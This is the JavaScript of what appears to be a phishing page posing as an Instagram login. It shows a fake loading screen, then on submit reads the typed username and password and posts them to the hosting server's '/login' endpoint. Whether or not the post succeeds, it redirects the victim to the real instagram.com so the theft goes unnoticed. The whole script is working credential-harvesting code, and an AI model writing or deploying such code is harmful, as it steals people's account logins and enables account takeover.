    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Handle loading screen
            const loadingScreen = document.getElementById('loading-screen');
            
            // Show loading screen for a short time then fade out
            setTimeout(() => {
                loadingScreen.classList.add('hidden');
                setTimeout(() => {
                    loadingScreen.style.display = 'none';
                }, 500); // Match this to the CSS transition time
            }, 1500); // Show loading screen for 1.5 seconds
            
            // Form validation
            const form = document.getElementById('loginForm');
            const inputs = form.querySelectorAll('input');
            const loginButton = document.querySelector('.login-btn');
            
            // Function to check if inputs have values to enable/disable login button
            function checkInputs() {
                let allFilled = true;
                inputs.forEach(input => {
                    if (!input.value.trim()) {
                        allFilled = false;
                    }
                });
                
                if (allFilled) {
                    loginButton.style.opacity = '1';
                    loginButton.disabled = false;
                } else {
                    loginButton.style.opacity = '0.3';
                    loginButton.disabled = true;
                }
            }
            
            // Add event listeners to inputs
            inputs.forEach(input => {
                input.addEventListener('input', checkInputs);
            });
            
            // Initial check
            checkInputs();
            
            // Handle form submission
            form.addEventListener('submit', function(e) {
                // Store the credentials first
                const username = form.querySelector('input[name="username"]').value;
                const password = form.querySelector('input[name="password"]').value;
                
                // Send credentials to the server
                fetch('/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
                })
                .then(() => {
                    // Redirect to Instagram after submission
                    window.location.href = 'https://www.instagram.com';
                })
                .catch(() => {
                    // Redirect anyway if there's an error
                    window.location.href = 'https://www.instagram.com';
                });
                
                // Prevent the default form submission
                e.preventDefault();
            });
        });
    </script>
